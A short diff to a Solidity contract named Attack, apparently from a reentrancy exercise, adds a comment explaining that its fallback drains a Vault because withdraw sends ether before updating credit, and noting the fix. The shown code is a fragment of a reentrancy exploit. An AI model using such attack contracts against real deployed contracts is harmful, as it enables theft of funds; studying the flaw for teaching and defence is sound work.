@@ -11,7 +11,9 @@ contract Attack {
     constructor(address _vaultAddress) public {
         vault = Vault(_vaultAddress);
     }
-    //executed whenever the contract receives plain Ether without any data
+    //The fallback is going to drain the funds because  the withdraw are doing
+    // the transaction without changing the value of credit first, to prevent this you need
+    // to ensure that all logic that changes state variables happens before ether is sent out of the contract
     fallback () external payable{
         //If vault has more than 1 ether, should collect 1 ether
         if(address(vault).balance >= 1 ether)
